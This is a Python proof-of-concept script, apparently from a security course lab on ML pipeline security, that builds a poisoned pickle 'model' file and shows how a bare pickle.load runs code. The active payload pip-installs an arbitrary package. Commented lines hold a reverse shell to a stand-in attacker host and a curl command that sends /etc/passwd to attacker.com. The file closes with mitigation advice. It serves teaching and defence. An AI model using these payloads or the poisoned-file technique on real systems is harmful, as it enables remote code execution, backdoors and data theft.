#!/usr/bin/env python3
"""
PoC: Poisoned Pipeline Attack via Pickle Deserialization
CAISP Lab 10 - Session 10: MLSecOps and AI Pipelines

This proof-of-concept demonstrates how an attacker can compromise
a machine learning pipeline by injecting malicious code into a Pickle file
that gets deserialized during model loading.

WARNING: This code is for educational purposes only in controlled environments.
"""

import pickle
import os
import subprocess
import sys


class MaliciousPayload:
    """
    Malicious class that executes arbitrary code during unpickling.
    This demonstrates the risk of using pickle.load() on untrusted data.
    """
    
    def __reduce__(self):
        # This method is called during pickle deserialization
        # It returns a tuple: (callable, args)
        # The callable will be executed when the object is unpickled
        
        # Example 1: Execute system command
        # return (os.system, ('echo "PWNED: Pickle deserialization executed!"',))
        
        # Example 2: Reverse shell (commented for safety)
        # return (subprocess.call, (['/bin/bash', '-c', 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'],))
        
        # Example 3: Data exfiltration
        # return (subprocess.call, (['curl', '-X', 'POST', '-d', '@/etc/passwd', 'http://attacker.com/exfil'],))
        
        # Example 4: Install backdoor package
        return (
            subprocess.call,
            (['pip', 'install', '--user', 'malicious-package'],)
        )


def create_poisoned_model(model_path="poisoned_model.pkl"):
    """
    Creates a poisoned Pickle file that executes malicious code when loaded.
    
    Args:
        model_path: Path where the poisoned model will be saved
    """
    print(f"[*] Creating poisoned Pickle file: {model_path}")
    
    # Create a fake "model" object that contains our malicious payload
    fake_model = {
        'model_type': 'classifier',
        'weights': [1, 2, 3, 4, 5],
        'payload': MaliciousPayload()  # This will execute on unpickling
    }
    
    # Serialize to Pickle file
    with open(model_path, 'wb') as f:
        pickle.dump(fake_model, f)
    
    print(f"[+] Poisoned model saved to {model_path}")
    print("[!] WARNING: Do not load this file in a production environment!")


def vulnerable_load(model_path):
    """
    Simulates a vulnerable ML pipeline that loads models using pickle.load()
    without proper validation.
    
    This is the vulnerable code pattern found in many ML pipelines.
    """
    print(f"\n[*] Simulating vulnerable model loading from {model_path}")
    print("[!] This code is vulnerable to Pickle deserialization attacks!")
    
    try:
        with open(model_path, 'rb') as f:
            model = pickle.load(f)  # DANGEROUS: Executes arbitrary code
        print("[+] Model loaded successfully (but code was executed!)")
        return model
    except Exception as e:
        print(f"[!] Error loading model: {e}")
        return None


def safe_load_alternative(model_path):
    """
    Demonstrates safer alternatives to Pickle for model serialization.
    
    Recommended alternatives:
    - SafeTensors (Hugging Face)
    - Joblib with security checks
    - ONNX format
    - TensorFlow SavedModel
    - PyTorch torch.save() with custom serialization
    """
    print("\n[*] Safe loading alternatives:")
    print("  1. Use SafeTensors instead of Pickle")
    print("  2. Validate model checksums before loading")
    print("  3. Load models in sandboxed environments")
    print("  4. Use allowlists for deserialized classes")
    print("  5. Implement model signing and verification")


def demonstrate_attack():
    """
    Main function to demonstrate the poisoned pipeline attack.
    """
    print("=" * 60)
    print("PoC: Poisoned Pipeline Attack via Pickle Deserialization")
    print("CAISP Lab 10 - MLSecOps Security")
    print("=" * 60)
    print()
    
    # Step 1: Create the poisoned model
    poisoned_model_path = "poisoned_model.pkl"
    create_poisoned_model(poisoned_model_path)
    
    # Step 2: Demonstrate the attack
    print("\n" + "=" * 60)
    print("ATTACK SCENARIO:")
    print("=" * 60)
    print("An attacker compromises a GitHub Actions workflow or")
    print("CI/CD pipeline and replaces a legitimate model file")
    print("with a poisoned Pickle file.")
    print()
    print("When the pipeline loads the model using pickle.load(),")
    print("the malicious code executes automatically.")
    print()
    
    # Step 3: Show vulnerable code
    response = input("\n[?] Execute vulnerable load? (yes/no): ").strip().lower()
    if response == 'yes':
        vulnerable_load(poisoned_model_path)
    else:
        print("[*] Skipping vulnerable load execution")
    
    # Step 4: Show mitigation strategies
    safe_load_alternative(poisoned_model_path)
    
    print("\n" + "=" * 60)
    print("MITIGATION RECOMMENDATIONS:")
    print("=" * 60)
    print("1. Never use pickle.load() on untrusted data")
    print("2. Use SafeTensors or other secure serialization formats")
    print("3. Implement model signing and verification (CoSign)")
    print("4. Scan models with SAST tools (Checkov)")
    print("5. Use Software Composition Analysis (SCA) for dependencies")
    print("6. Implement MLSecOps practices in CI/CD pipelines")
    print("7. Isolate model loading in sandboxed containers")
    print("=" * 60)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--create-only":
        # Just create the poisoned file without executing
        create_poisoned_model()
        print("\n[!] Poisoned file created. Do not load in production!")
    else:
        demonstrate_attack()

